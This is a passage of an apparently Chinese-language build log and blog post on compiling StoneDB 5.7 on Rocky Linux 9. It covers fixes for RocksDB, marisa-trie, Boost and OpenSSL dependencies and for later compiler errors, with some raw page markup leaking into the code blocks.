                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231112-071981b4-a9da-43e4-bae3-ac7fdd31e220.png"
                      referrerpolicy="no-referrer"
                >
<p><a class="link"   href="https://github.com/facebook/rocksdb/releases/tag/v6.12.6" >RocksDB 6.12.6 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 发行于 2020-10-13，目前，最新版本为 <a class="link"   href="https://github.com/facebook/rocksdb/releases/tag/v8.6.7" >RocksDB 8.6.7 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 发行于 09/26/2023。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">-- Could not find (the correct version of) rocksdb.</span><br><span class="line">-- MySQL currently requires vrocksdb-6.12.6</span><br><span class="line"></span><br><span class="line">CMake Error at cmake/rocksdb.cmake:81 (MESSAGE):</span><br><span class="line">  You can download it with -DDOWNLOAD_ROCKSDB=1 -DWITH_ROCKSDB=&lt;directory&gt;</span><br><span class="line"></span><br><span class="line">  This CMake script will look for rocksdb in &lt;directory&gt;.  If it is not</span><br><span class="line">  there, it will download and unpack it (in that directory) for you.</span><br><span class="line"></span><br><span class="line">  If you are inside a firewall, you may need to use an http proxy:</span><br><span class="line"></span><br><span class="line">  export http_proxy=http://example.com:80</span><br><span class="line"></span><br><span class="line">Call Stack (most recent call first):</span><br><span class="line">  cmake/rocksdb.cmake:239 (COULD_NOT_FIND_ROCKSDB)</span><br><span class="line">  CMakeLists.txt:315 (INCLUDE)</span><br></pre></td></tr></table></figure></div>
<!--
https://github.com/facebook/rocksdb/archive/refs/tags/vrocksdb-6.12.6.tar.gz
https://github.com/facebook/rocksdb/archive/refs/tags/v6.12.6.tar.gz
https://github.com/facebook/rocksdb/releases/tag/v6.12.6
tar zxf rocksdb-6.12.6.tar.gz
-->
<p>下载 rocksdb 源码包后，配置正常。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">-- Local rocksdb dir /data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6</span><br><span class="line">found ROCKSDB_INCLUDE_DIR:/data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6</span><br><span class="line">-- Found /data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6/include/rocksdb/version.h</span><br><span class="line">-- current ROCKSDB_VERSION_NUMBER is #define ROCKSDB_MAJOR 6.#define ROCKSDB_MINOR 12</span><br><span class="line">-- current ROCKSDB_MAJOR_VERSION is: 6, ROCKSDB_MAJOR_VERSION:12</span><br><span class="line">-- ROCKSDB_INCLUDE_DIR /data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6</span><br></pre></td></tr></table></figure></div>
<h3 id="marisa-trie-下载链接">marisa-trie 下载链接</h3>
<p>StoneDB 依赖“玛丽莎”，同上，需要提前下载源码包。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">found MARISA_INCLUDE_DIR:MARISA_INCLUDE_DIR-NOTFOUND</span><br><span class="line">-- Looked for include/marisa.h in  and</span><br><span class="line">-- MARISA_INCLUDE_DIR MARISA_INCLUDE_DIR-NOTFOUND</span><br><span class="line">-- LOCAL_MARISA_DIR</span><br><span class="line">-- Could not find (the correct version of) marisa.</span><br><span class="line">-- MySQL currently requires marisa-trie</span><br><span class="line"></span><br><span class="line">CMake Error at cmake/marisa.cmake:59 (MESSAGE):</span><br><span class="line">  You can download it, install it, then specify the marisa path with</span><br><span class="line">  -DWITH_MARISA=&lt;director&gt;</span><br><span class="line"></span><br><span class="line">  This CMake script will look for marisa in &lt;directory&gt;.</span><br><span class="line">Call Stack (most recent call first):</span><br><span class="line">  cmake/marisa.cmake:123 (COULD_NOT_FIND_MARISA)</span><br><span class="line">  CMakeLists.txt:323 (INCLUDE)</span><br></pre></td></tr></table></figure></div>
<p>也可以编译时自动下载，只是这里还有个小包袱，git变成了gi。</p>
<img  alt="img6-git-marisa.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231112-df8a7e4c-5e88-4bc7-92b0-996c777b226d.png"
                      referrerpolicy="no-referrer"
                >
<p>完整地址为：</p>
<p><a class="link"   href="https://github.com/s-yata/marisa-trie/archive/refs/tags/v0.2.6.tar.gz" >https://github.com/s-yata/marisa-trie/archive/refs/tags/v0.2.6.tar.gz <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="boost-版本升级">boost 版本升级</h3>
<p>StoneDB 5.7 依赖 boost 1.66.0，但编译时报错。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 boost_1_66_0]$ ./bootstrap.sh</span><br><span class="line">[shawnyan@rocky9 boost_1_66_0]$ ./b2</span><br><span class="line"></span><br><span class="line">...failed gcc.compile.c++ bin.v2/libs/python/build/gcc-gnu-11/release/link-static/threadapi-pthread/threading-multi/converter/builtin_converters.o...</span><br><span class="line">...skipped &lt;pbin.v2/libs/python/build/gcc-gnu-11/release/link-static/threadapi-pthread/threading-multi&gt;libboost_python3.a(clean) for lack of &lt;pbin.v2/libs/python/build/gcc-gnu-11/release/link-static/threadapi-pthread/threading-multi&gt;converter/builtin_converters.o...</span><br><span class="line">...skipped &lt;pbin.v2/libs/python/build/gcc-gnu-11/release/link-static/threadapi-pthread/threading-multi&gt;libboost_python3.a for lack of &lt;pbin.v2/libs/python/build/gcc-gnu-11/release/link-static/threadapi-pthread/threading-multi&gt;converter/builtin_converters.o...</span><br><span class="line">...skipped &lt;pstage/lib&gt;libboost_python3.a for lack of &lt;pbin.v2/libs/python/build/gcc-gnu-11/release/link-static/threadapi-pthread/threading-multi&gt;libboost_python3.a...</span><br><span class="line">...failed updating 2 targets...</span><br><span class="line">...skipped 6 targets...</span><br></pre></td></tr></table></figure></div>
<p>所以，我就升级到了 boost 1.77.0，并修改了基础标识。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./cmake/boost.cmake:SET(BOOST_PACKAGE_NAME &quot;boost_1_66_0&quot;)</span><br><span class="line">./cmake/boost.cmake:SET(BOOST_PATCHES_DIR &quot;$&#123;CMAKE_SOURCE_DIR&#125;/include/boost_1_66_0/patches&quot;)</span><br><span class="line">./cmake/boost.cmake:SET(BOOST_SOURCES_DIR &quot;$&#123;CMAKE_SOURCE_DIR&#125;/include/boost_1_66_0&quot;)</span><br><span class="line">./codecov.yml:- &quot;include/boost_1_66_0&quot;</span><br></pre></td></tr></table></figure></div>
<!--
https://www.boost.org/users/history/version_1_66_0.html
https://sourceforge.net/projects/boost/files/boost/1.66.0/boost_1_66_0.tar.gz
https://sourceforge.net/projects/boost/files/boost/1.77.0/boost_1_77_0.tar.gz
https://pkgs.org/download/boost

sed -i 's/75/77/g' ./cmake/boost.cmake
grep 75 ./cmake/boost.cmake
sed -i 's/75/77/g' ./codecov.yml
cat ./codecov.yml

vi ../cmake/boost.cmake
include/boost/version.hpp -> boost/version.hpp
-->
<p>升级后，可以正常进行编译。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">...updated 1745 targets...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The Boost C++ Libraries were successfully built!</span><br><span class="line"></span><br><span class="line">The following directory should be added to compiler include paths:</span><br><span class="line"></span><br><span class="line">    /data/stonedb-stonedb-5.7-dev/release/boost_1_77_0</span><br><span class="line"></span><br><span class="line">The following directory should be added to linker library paths:</span><br><span class="line"></span><br><span class="line">    /data/stonedb-stonedb-5.7-dev/release/boost_1_77_0/stage/lib</span><br><span class="line"></span><br><span class="line">[shawnyan@rocky9 boost_1_77_0]$</span><br></pre></td></tr></table></figure></div>
<h3 id="openssl-1-1-1">openssl 1.1.1</h3>
<p>Rocky 9 中通过 dnf 安装的 openssl 为 3.x 版本，版本太新，配置无法识别，而且和 1.1.1 系列代码差异很大，这里下载了 openssl 1.1.1 系列的最新版本 <code>openssl-1.1.1w</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Cannot find appropriate system libraries for WITH_SSL=system.</span><br><span class="line">Make sure you have specified a supported SSL version.</span><br><span class="line">Valid options are :</span><br><span class="line">system (use the OS openssl library),</span><br><span class="line">yes (synonym for system),</span><br><span class="line">&lt;/path/to/custom/openssl/installation&gt;</span><br><span class="line"></span><br><span class="line">CMake Error at cmake/ssl.cmake:63 (MESSAGE):</span><br><span class="line">  Please install the appropriate openssl developer package.</span><br><span class="line"></span><br><span class="line">Call Stack (most recent call first):</span><br><span class="line">  cmake/ssl.cmake:280 (FATAL_SSL_NOT_FOUND_ERROR)</span><br><span class="line">  CMakeLists.txt:630 (MYSQL_CHECK_SSL)</span><br></pre></td></tr></table></figure></div>
<!--
https://github.com/openssl/openssl/releases/download/OpenSSL_1_1_1w/openssl-1.1.1w.tar.gz
https://github.com/openssl/openssl/archive/refs/tags/OpenSSL_1_1_1w.tar.gz
-->
<p>下载后，配置安装 openssl。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./config</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<hr>
<!--
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- library target mysqlserver debug_target /data/stonedb-stonedb-5.7-dev/debug/archive_output_directory/libmysqld.a</span><br><span class="line">RegularExpression::compile(): Nested *?+.</span><br><span class="line">RegularExpression::compile(): Error in compile.</span><br><span class="line">CMake Error at scripts/CMakeLists.txt:321 (IF):</span><br><span class="line">  if given arguments:</span><br><span class="line"></span><br><span class="line">    &quot;NOT&quot; &quot;lib&quot; &quot;STREQUAL&quot; &quot;general&quot; &quot;AND&quot; &quot;NOT&quot; &quot;EMBEDD_LIBS&quot; &quot;MATCHES&quot; &quot;-lstdc++fs &quot; &quot;AND&quot; &quot;NOT&quot; &quot;lib&quot; &quot;MATCHES&quot; &quot;imported_&quot;</span><br><span class="line"></span><br><span class="line">  Regular expression &quot;-lstdc++fs &quot; cannot compile</span><br><span class="line">Call Stack (most recent call first):</span><br><span class="line">  scripts/CMakeLists.txt:352 (EXTRACT_LINK_LIBRARIES)</span><br></pre></td></tr></table></figure></div>
<p><a class="link"   href="https://github.com/stoneatom/stonedb/blob/stonedb-5.7-dev/configure.cmake#L59" >https://github.com/stoneatom/stonedb/blob/stonedb-5.7-dev/configure.cmake#L59 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(CMAKE_SYSTEM_NAME MATCHES &quot;SunOS&quot; AND CMAKE_COMPILER_IS_GNUCXX)</span><br><span class="line">  ## We will be using gcc to generate .so files</span><br><span class="line">  ## Add C flags (e.g. -m64) to CMAKE_SHARED_LIBRARY_C_FLAGS</span><br><span class="line">  ## The client library contains C++ code, so add dependency on libstdc++</span><br><span class="line">  ## See cmake --help-policy CMP0018</span><br><span class="line">  SET(CMAKE_SHARED_LIBRARY_C_FLAGS</span><br><span class="line">    &quot;$&#123;CMAKE_SHARED_LIBRARY_C_FLAGS&#125; $&#123;CMAKE_C_FLAGS&#125; -lstdc++&quot;)</span><br><span class="line">ENDIF()</span><br></pre></td></tr></table></figure></div>
<p><a class="link"   href="https://github.com/stoneatom/stonedb/blob/stonedb-5.7-dev/scripts/CMakeLists.txt#L352" >https://github.com/stoneatom/stonedb/blob/stonedb-5.7-dev/scripts/CMakeLists.txt#L352 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">IF(WITH_EMBEDDED_SERVER)</span><br><span class="line">  EXTRACT_LINK_LIBRARIES(mysqlserver EMBEDD_LIBS)</span><br><span class="line">  IF(SOLARIS AND CMAKE_C_FLAGS MATCHES &quot;-xatomic=gcc&quot;)</span><br><span class="line">    STRING_APPEND(EMBEDD_LIBS &quot; -xatomic=gcc&quot;)</span><br><span class="line">  ENDIF()</span><br><span class="line">ENDIF()</span><br></pre></td></tr></table></figure></div>
<p>跳过， WITH_EMBEDDED_SERVER</p>
<hr>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMake Error at cmake/libutils.cmake:85 (ADD_LIBRARY):</span><br><span class="line">  Cannot find source file:</span><br><span class="line"></span><br><span class="line">    /data/stonedb-stonedb-5.7-dev/boost_1_77_0/libs/chrono/src/chrono.cpp</span><br><span class="line"></span><br><span class="line">  Tried extensions .c .C .c++ .cc .cpp .cxx .cu .mpp .m .M .mm .h .hh .h++</span><br><span class="line">  .hm .hpp .hxx .in .txx .f .F .for .f77 .f90 .f95 .f03 .ispc</span><br><span class="line">Call Stack (most recent call first):</span><br><span class="line">  client/dump/CMakeLists.txt:48 (ADD_CONVENIENCE_LIBRARY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CMake Error at cmake/libutils.cmake:85 (ADD_LIBRARY):</span><br><span class="line">  No SOURCES given to target: boost_lib</span><br><span class="line">Call Stack (most recent call first):</span><br><span class="line">  client/dump/CMakeLists.txt:48 (ADD_CONVENIENCE_LIBRARY)</span><br></pre></td></tr></table></figure></div>
<p><a class="link"   href="https://github.com/stoneatom/stonedb/blob/stonedb-5.7-dev/client/dump/CMakeLists.txt#L48" >https://github.com/stoneatom/stonedb/blob/stonedb-5.7-dev/client/dump/CMakeLists.txt#L48 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET(BOOST_LIB_SOURCES</span><br><span class="line">  $&#123;BOOST_SOURCES_DIR&#125;/libs/chrono/src/chrono.cpp</span><br><span class="line">IF(USING_LOCAL_BOOST)</span><br><span class="line">  ADD_CONVENIENCE_LIBRARY(boost_lib $&#123;BOOST_LIB_SOURCES&#125;)</span><br></pre></td></tr></table></figure></div>
<hr>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMake Error at cmake/libutils.cmake:85 (ADD_LIBRARY):</span><br><span class="line">  Cannot find source file:</span><br><span class="line"></span><br><span class="line">    /data/stonedb-stonedb-5.7-dev/boost_1_77_0/libs/chrono/src/chrono.cpp</span><br><span class="line"></span><br><span class="line">  Tried extensions .c .C .c++ .cc .cpp .cxx .cu .mpp .m .M .mm .h .hh .h++</span><br><span class="line">  .hm .hpp .hxx .in .txx .f .F .for .f77 .f90 .f95 .f03 .ispc</span><br><span class="line">Call Stack (most recent call first):</span><br><span class="line">  client/dump/CMakeLists.txt:48 (ADD_CONVENIENCE_LIBRARY)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CMake Error at cmake/libutils.cmake:85 (ADD_LIBRARY):</span><br><span class="line">  No SOURCES given to target: boost_lib</span><br><span class="line">Call Stack (most recent call first):</span><br><span class="line">  client/dump/CMakeLists.txt:48 (ADD_CONVENIENCE_LIBRARY)</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /data/boost_1_77_0.tar.gz .</span><br><span class="line">tar zxf boost_1_77_0.tar.gz</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">### 配置参数</span><br><span class="line"></span><br><span class="line">到目前未知，配置阶段完成，来看下配置参数和输出结果。</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">cmake .. \</span><br><span class="line">-DWITH_BOOST=. \</span><br><span class="line">-DWITH_ROCKSDB=./rocksdb-6.12.6/ \</span><br><span class="line">-DWITH_SSL=system \</span><br><span class="line">-DWITH_EMBEDDED_SERVER=0 \</span><br><span class="line">-DBOOST_SOURCES_DIR=./release/boost_1_77_0/ \</span><br><span class="line">-Dimt=OFF \</span><br><span class="line">-DWITH_UNIT_TESTS=OFF \</span><br><span class="line">-DINSTALL_MYSQLTESTDIR= \</span><br><span class="line">-DMYSQL_VERSION_EXTRA=ShawnYan</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">输出日志：</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">-- CMAKE_BUILD_TYPE: RelWithDebInfo</span><br><span class="line">-- COMPILE_DEFINITIONS: _GNU_SOURCE;_FILE_OFFSET_BITS=64;HAVE_CONFIG_H;TIANMU;_GLIBCXX_USE_CXX11_ABI=1;HAVE_TLSv13</span><br><span class="line">-- CMAKE_C_FLAGS: -fPIC -fabi-version=2 -fno-omit-frame-pointer -fno-strict-aliasing  -Wall -Wextra -Wformat-security -Wvla -Wimplicit-fallthrough=2 -Wno-unknown-pragmas -Wwrite-strings -Wdeclaration-after-statement</span><br><span class="line">-- CMAKE_CXX_FLAGS: -fPIC -std=gnu++03 -fabi-version=2 -fno-omit-frame-pointer -fno-strict-aliasing  -Wall -Wextra -Wformat-security -Wvla -Wimplicit-fallthrough=2 -Wno-unknown-pragmas -Woverloaded-virtual -Wno-unused-paramete</span><br><span class="line">-- CMAKE_CXX_FLAGS_DEBUG: -DENABLED_DEBUG_SYNC -DSAFE_MUTEX -g -gdwarf-2 -std=c++1z -fno-sized-deallocation</span><br><span class="line">-- CMAKE_CXX_FLAGS_RELWITHDEBINFO: -ffunction-sections -fdata-sections -O3 -g -DNDEBUG -gdwarf-2 -std=c++1z -fno-sized-deallocation</span><br><span class="line">-- CMAKE_CXX_FLAGS_RELEASE: -ffunction-sections -fdata-sections -O3 -DNDEBUG -std=c++1z -fno-sized-deallocation</span><br><span class="line">-- CMAKE_CXX_FLAGS_MINSIZEREL: -ffunction-sections -fdata-sections -Os -DNDEBUG</span><br><span class="line">-- CMAKE_C_LINK_FLAGS:</span><br><span class="line">-- CMAKE_CXX_LINK_FLAGS:</span><br><span class="line">-- CMAKE_EXE_LINKER_FLAGS</span><br><span class="line">-- CMAKE_MODULE_LINKER_FLAGS  -Wl,--build-id</span><br><span class="line">-- CMAKE_SHARED_LINKER_FLAGS  -Wl,--build-id</span><br><span class="line">-- Configuring done</span><br><span class="line">-- Generating done</span><br><span class="line">-- Build files have been written to: /data/stonedb-stonedb-5.7-dev/release</span><br><span class="line">[shawnyan@rocky9 release]$</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">## 编译过程</span><br><span class="line"></span><br><span class="line">配置完成，下面开始真正编译过程。</span><br><span class="line"></span><br><span class="line">### 提示无法找到 `stdc++`</span><br><span class="line"></span><br><span class="line">编译时遇到报错，提示无法找到 `stdc++`。</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">/usr/bin/ld: cannot find -lstdc++</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br><span class="line">make[2]: *** [extra/CMakeFiles/comp_err.dir/build.make:107: extra/comp_err] Error 1</span><br><span class="line">make[1]: *** [CMakeFiles/Makefile2:5469: extra/CMakeFiles/comp_err.dir/all] Error 2</span><br><span class="line">make: *** [Makefile:166: all] Error 2</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">可能是缺少依赖包导致的，安装依赖。</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">yum install libstdc++-static</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">查看系统lib，再补充一个软连接。</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">[root@rocky9 lib64]# sudo ln -s libstdc++.so.6 libstdc++.so</span><br><span class="line">[root@rocky9 lib64]# ll *std*</span><br><span class="line">lrwxrwxrwx. 1 root root      14 Nov 10 22:46 libstdc++.so -&gt; libstdc++.so.6</span><br><span class="line">lrwxrwxrwx. 1 root root      19 Apr 10  2023 libstdc++.so.6 -&gt; libstdc++.so.6.0.29</span><br><span class="line">-rwxr-xr-x. 1 root root 2306520 Apr 10  2023 libstdc++.so.6.0.29</span><br><span class="line">lrwxrwxrwx. 1 root root      16 May 27  2022 libzstd.so -&gt; libzstd.so.1.5.1</span><br><span class="line">lrwxrwxrwx. 1 root root      16 May 27  2022 libzstd.so.1 -&gt; libzstd.so.1.5.1</span><br><span class="line">-rwxr-xr-x. 1 root root  882384 May 27  2022 libzstd.so.1.5.1</span><br><span class="line">[root@rocky9 lib64]#</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### boost 文件路径变化</span><br><span class="line"></span><br><span class="line">编译到 37% 遇到错误退出，提示无法找到文件。</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">[ 37%] Building CXX object storage/tianmu/CMakeFiles/tianmu.dir/common/data_format.cpp.o</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/common/data_format.cpp:23:10: fatal error: boost/algorithm/string.hpp: No such file or directory</span><br><span class="line">   23 | #include &lt;boost/algorithm/string.hpp&gt;</span><br><span class="line">      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br><span class="line">make[2]: *** [storage/tianmu/CMakeFiles/tianmu.dir/build.make:90: storage/tianmu/CMakeFiles/tianmu.dir/common/data_format.cpp.o] Error 1</span><br><span class="line">make[1]: *** [CMakeFiles/Makefile2:3704: storage/tianmu/CMakeFiles/tianmu.dir/all] Error 2</span><br><span class="line">make: *** [Makefile:166: all] Error 2</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">对比确认是路径有出入，在源码目录的 `include` 文件夹下，创建一个 `boost` 的软连接。</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">[root@rocky9 algorithm]# ll /data/stonedb-stonedb-5.7-dev/boost_1_77_0/boost/algorithm/string.hpp</span><br><span class="line">-rw-r--r--. 1 shawnyan shawnyan 1061 Aug  5  2021 /data/stonedb-stonedb-5.7-dev/boost_1_77_0/boost/algorithm/string.hpp</span><br><span class="line">[root@rocky9 algorithm]#</span><br><span class="line">...</span><br><span class="line">[root@rocky9 include]# pwd</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/include</span><br><span class="line">[root@rocky9 include]# ln -s ../boost_1_77_0/boost .</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">https://github.com/stoneatom/stonedb/issues/256</span><br><span class="line">docker make fatal error: boost/algorithm/string.hpp: No such file or directorybug: #256</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### marisa/rocksdb hard code</span><br><span class="line"></span><br><span class="line">准备依赖包时，已将 marisa/rocksdb 放到了编译路径下，这里是 `/data/stonedb-stonedb-5.7-dev/release`，但仍然遇到了找不到的问题。</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">/usr/include/c++/11/bits/unique_ptr.h:211:7: note:   candidate expects 1 argument, 0 provided</span><br><span class="line">make[2]: *** [storage/tianmu/CMakeFiles/tianmu.dir/build.make:258: storage/tianmu/CMakeFiles/tianmu.dir/compress/ppm.cpp.o] Error 1</span><br><span class="line">make[1]: *** [CMakeFiles/Makefile2:3704: storage/tianmu/CMakeFiles/tianmu.dir/all] Error 2</span><br><span class="line">make: *** [Makefile:166: all] Error 2</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">cd /data/stonedb-stonedb-5.7-dev/release/storage/tianmu &amp;&amp; /usr/bin/c++ $(CXX_DEFINES) $(CXX_INCLUDES) $(CXX_FLAGS) -MD -MT storage/tianmu/CMakeFiles/tianmu.dir/compress/ppm.cpp.o -MF CMakeFiles/tianmu.dir/compres     s/ppm.cpp.o.d -o CMakeFiles/tianmu.dir/compress/ppm.cpp.o -c /data/stonedb-stonedb-5.7-dev/storage/tianmu/compress/ppm.cpp</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">细看了一眼，发现了两处硬编码，所以简单做了个软连处理。</span><br><span class="line"></span><br><span class="line">- hard code</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">SET(MARISA_ROOT /usr/local/stonedb-marisa)</span><br><span class="line">SET(ROCKSDB_ROOT /usr/local/stonedb-gcc-rocksdb)</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">- soft link</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">ln -s /data/stonedb-stonedb-5.7-dev/release/marisa-trie-0.2.6 /usr/local/stonedb-marisa</span><br><span class="line">ln -s /data/stonedb-stonedb-5.7-dev/release/rocksdb-6.12.6 /usr/local/stonedb-gcc-rocksdb</span><br><span class="line">ll /usr/local/stonedb-marisa</span><br><span class="line">ll /usr/local/stonedb-gcc-rocksdb</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">### COMMON_C_FLAGS</span><br><span class="line"></span><br><span class="line">编译进度来到了 40%，由于 gcc 版本变化，FLAG 也随之发生了变动，这里修改了两处。</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">https://root-forum.cern.ch/t/fail-to-compile-root-6-20-04-on-fedora-32/38990/5</span><br><span class="line">Temporary solution: cmake with -Dimt=OFF</span><br><span class="line">但是，还是报错</span><br><span class="line"></span><br><span class="line">https://jira.percona.com/browse/PXB-2649</span><br><span class="line">https://github.com/percona/percona-xtrabackup/pull/1240/files</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">- 报错日志</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">[ 40%] Building CXX object storage/tianmu/CMakeFiles/tianmu.dir/compress/ppm.cpp.o</span><br><span class="line">In file included from /usr/include/c++/11/memory:76,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/common/common_definitions.h:23,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/common/exception.h:23,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/common/assert.h:23,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/compress/data_stream.h:23,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/compress/arith_coder.h:21,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/compress/ppm.h:23,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/compress/ppm.cpp:18:</span><br><span class="line">/usr/include/c++/11/bits/unique_ptr.h: In instantiation of ‘constexpr std::unique_ptr&lt;_Tp, _Dp&gt;::unique_ptr() [with _Del = std::default_delete&lt;TSianmu::compress::PPMModel&gt;; &lt;template-parameter-2-2&gt; = void; _Tp = Tianmu::compress::PPMModel; _Dp = std::default_delete&lt;Tianmu::compress::PPMModel&gt;]’:</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/compress/ppm.cpp:32:80:   required from here</span><br><span class="line">/usr/include/c++/11/bits/unique_ptr.h:270:11: error: no matching function for call to ‘std::__uniq_ptr_data&lt;Tianmu::compress::PPMModel, std::default_delete&lt;Tianmu::compress::PPMModel&gt;, true, true&gt;::__uniq_ptr_data()’</span><br><span class="line">  270 |         : _M_t()</span><br><span class="line">      |           ^~~~~~</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">- 修改内容</span><br><span class="line"></span><br><span class="line">影响文件：`cmake\build_configurations\compiler_options.cmake`</span><br><span class="line"></span><br><span class="line">- https://github.com/stoneatom/stonedb/blob/stonedb-5.7-dev/cmake/build_configurations/compiler_options.cmake#L46</span><br><span class="line">- https://github.com/stoneatom/stonedb/blob/stonedb-5.7-dev/cmake/build_configurations/compiler_options.cmake#L71</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">- SET(COMMON_C_FLAGS &quot;-fabi-version=2 -fno-omit-frame-pointer -fno-strict-aliasing&quot;)</span><br><span class="line">+ SET(COMMON_C_FLAGS &quot;-fno-omit-frame-pointer -fno-strict-aliasing&quot;)</span><br><span class="line">...</span><br><span class="line">- SET(COMMON_CXX_FLAGS               &quot;-fabi-version=2 -fno-omit-frame-pointer -fno-strict-aliasing&quot;)</span><br><span class="line">+ SET(COMMON_CXX_FLAGS               &quot;-fno-omit-frame-pointer -fno-strict-aliasing&quot;)</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">[ 41%] Building CXX object storage/tianmu/CMakeFiles/tianmu.dir/core/data_cache.cpp.o</span><br><span class="line">In file included from /data/stonedb-stonedb-5.7-dev/storage/tianmu/index/rsi_histogram.h:22,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/vc/tianmu_attr.h:31,</span><br><span class="line">                 from /data/stonedb-stonedb-5.7-dev/storage/tianmu/core/data_cache.cpp:20:</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/data/pack_int.h:54:60: error: ‘optional’ in namespace ‘std’ does not name a template type</span><br><span class="line">   54 |   void LoadValues(const loader::ValueCache *vc, const std::optional&lt;common::double_int_t&gt; &amp;null_value);</span><br><span class="line">      |                                                            ^~~~~~~~</span><br><span class="line">/data/stonedb-stonedb-5.7-dev/storage/tianmu/data/pack_int.h:22:1: note: ‘std::optional’ is defined in header ‘&lt;optional&gt;’; did you forget to ‘#include &lt;optional&gt;’?</span><br><span class="line">   21 | #include &quot;core/value.h&quot;</span><br><span class="line">  +++ |+#include 